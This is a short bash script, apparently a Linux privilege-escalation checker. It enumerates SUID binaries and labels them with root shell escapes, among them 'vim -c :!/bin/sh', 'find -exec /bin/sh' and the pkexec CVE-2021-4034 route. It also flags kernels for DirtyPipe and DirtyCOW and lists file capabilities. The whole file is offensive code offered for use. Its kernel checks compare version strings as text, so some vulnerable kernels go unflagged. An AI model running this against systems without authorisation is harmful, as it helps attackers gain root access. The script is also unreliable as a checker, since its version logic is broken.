#!/bin/bash
echo "=== PRIVESC CHECK ==="
echo "[SUID]"
find / -perm -4000 -type f 2>/dev/null|while read f;do
case "$f" in *pkexec*)echo "  $f - CVE-2021-4034";;*nmap*)echo "  $f - nmap --interactive";;*vim*)echo "  $f - vim -c ':!/bin/sh'";;*find*)echo "  $f - find . -exec /bin/sh \\;";;*)echo "  $f";;esac
done|head -20
echo "[KERNEL]"
K=$(uname -r);echo "  $K"
[[ "$K" > "5.8" && "$K" < "5.17" ]]&&echo "  VULN: DirtyPipe"
[[ "$K" < "4.9" ]]&&echo "  VULN: DirtyCOW"
echo "[CAPABILITIES]"
getcap -r / 2>/dev/null|head -5
